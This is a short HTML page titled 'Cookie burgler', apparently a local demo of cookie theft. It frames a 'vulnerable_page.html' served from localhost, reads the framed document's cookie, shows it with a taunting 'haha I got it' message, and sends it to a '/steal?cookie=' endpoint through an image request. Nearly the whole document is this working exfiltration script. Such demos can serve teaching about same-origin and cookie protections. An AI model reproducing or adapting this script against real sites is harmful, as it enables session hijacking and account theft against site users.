<h1>Cookie burgler</h1>
<p>I am hungry and I have it on good authority that this site isn't protecting their cookie properly.</p>

<iframe src="http://localhost:4000/cookiejar/vulnerable_page.html" id="myframe" height="600" width="600"></iframe>

<script>
    document.cookie = '';
    const iframe = document.getElementById("myframe")
    document.write(iframe.contentDocument.cookie);
    setTimeout(function() {
        const p = document.createElement('p')
        p.innerHTML = iframe.contentDocument.cookie + " haha I got it. "
        document.body.appendChild(p)

        new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
    }, 5000)
</script>
